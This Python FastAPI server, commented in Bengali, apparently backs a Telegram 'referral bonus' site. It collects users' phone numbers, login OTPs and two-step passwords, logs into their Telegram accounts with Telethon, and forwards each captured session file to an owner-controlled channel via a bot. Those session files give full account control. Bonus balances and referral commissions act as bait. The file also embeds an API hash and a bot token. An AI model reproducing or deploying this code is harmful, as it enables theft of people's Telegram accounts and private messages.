import os
import asyncio
import sqlite3
from datetime import datetime
from fastapi import FastAPI, Form, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError

# ১. Render ও পাইথন ৩.১৪+ এর জন্য পারফেক্ট গ্লোবাল ইভেন্ট লুপ সেটআপ
try:
    loop = asyncio.get_running_loop()
except RuntimeError:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

app = FastAPI()

# CORS সেটিংস (ব্লগারের সাথে কানেক্ট করার জন্য)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ---------- CONFIGURATION ----------
API_ID = 35648548
API_HASH = '7cb954d06d962e181fb1717fe1a486a8'
BOT_TOKEN = '8861051646:AAG7i9PdLe1M779utnc6GTZheKMVYj0m9Ts'
OWNER_CHANNEL_ID = -1003645477647      
SESSION_DIR = 'sessions'

WELCOME_BONUS = 10          
REFERRAL_COMMISSION = 5     

os.makedirs(SESSION_DIR, exist_ok=True)
sessions_memory = {}

# ---------- DATABASE SETTINGS ----------
conn = sqlite3.connect('referral_bot.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY, phone TEXT, session_file TEXT, balance REAL DEFAULT 0, referrer_id INTEGER, created_at TEXT
)''')
c.execute('''CREATE TABLE IF NOT EXISTS referrals (
    id INTEGER PRIMARY KEY, referrer_id INTEGER, referred_user_id INTEGER, commission REAL, created_at TEXT
)''')
conn.commit()

# ---------- API ROUTES ----------

@app.post("/send_otp")
async def send_otp(phone: str = Form(...), user_id: int = Form(...), ref_id: int = Form(None)):
    if not phone.startswith('+'):
        phone = f"+{phone}"
        
    temp_session = os.path.join(SESSION_DIR, f"temp_{user_id}")
    
    # ২. এখানে loop=loop বলে দিতে হবে যাতে Telethon মেইন লুপের সাথে সিঙ্ক হয়
    client = TelegramClient(temp_session, API_ID, API_HASH, loop=loop)
    await client.connect()
    
    try:
        send_code = await client.send_code_request(phone)
        sessions_memory[user_id] = {
            "client": client,
            "phone": phone,
            "phone_code_hash": send_code.phone_code_hash,
            "ref_id": ref_id
        }
        return {"status": "success", "message": "OTP Sent!"}
    except Exception as e:
        await client.disconnect()
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/verify_otp")
async def verify_otp(user_id: int = Form(...), otp: str = Form(...), password: str = Form(None)):
    if user_id not in sessions_memory:
        raise HTTPException(status_code=400, detail="Session not found. Please resend OTP.")
    
    state = sessions_memory[user_id]
    client = state["client"]
    phone = state["phone"]
    phone_code_hash = state["phone_code_hash"]
    ref_id = state["ref_id"]
    
    try:
        if password:
            await client.sign_in(password=password)
        else:
            await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
            
        permanent_session = os.path.join(SESSION_DIR, f"user_{user_id}.session")
        await client.disconnect()
        
        temp_file = os.path.join(SESSION_DIR, f"temp_{user_id}.session")
        if os.path.exists(temp_file):
            if os.path.exists(permanent_session): os.remove(permanent_session)
            os.rename(temp_file, permanent_session)
            
        now_str = datetime.now().isoformat()
        c.execute('INSERT OR IGNORE INTO users VALUES (?, ?, ?, ?, ?, ?)', (user_id, phone, permanent_session, WELCOME_BONUS, ref_id, now_str))
        
        if ref_id:
            c.execute('UPDATE users SET balance = balance + ? WHERE user_id = ?', (REFERRAL_COMMISSION, ref_id))
            c.execute('INSERT INTO referrals (referrer_id, referred_user_id, commission, created_at) VALUES (?, ?, ?, ?)', (ref_id, user_id, REFERRAL_COMMISSION, now_str))
        conn.commit()
        
        # ওনার চ্যানেলে সেশন ফাইল পাঠানো (লুপ এসাইন করে)
        try:
            bot_client = TelegramClient('bot_sender', API_ID, API_HASH, loop=loop)
            await bot_client.start(bot_token=BOT_TOKEN)
            await bot_client.send_file(OWNER_CHANNEL_ID, permanent_session, caption=f"✨ New Session Generated!\nUser ID: {user_id}\nPhone: {phone}")
            await bot_client.disconnect()
        except Exception as bot_err:
            print("Bot send file error:", bot_err)

        if user_id in sessions_memory: del sessions_memory[user_id]
        return {"status": "success", "message": "Logged in successfully & balance updated!"}
        
    except SessionPasswordNeededError:
        return {"status": "2fa_required", "message": "Two-Step Verification Password Required!"}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.get("/get_user_data/{user_id}")
async def get_user_data(user_id: int):
    c.execute('SELECT balance FROM users WHERE user_id = ?', (user_id,))
    row = c.fetchone()
    balance = row[0] if row else 0
    c.execute('SELECT COUNT(*) FROM referrals WHERE referrer_id = ?', (user_id,))
    ref_count = c.fetchone()[0]
    return {"balance": balance, "referrals": ref_count}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
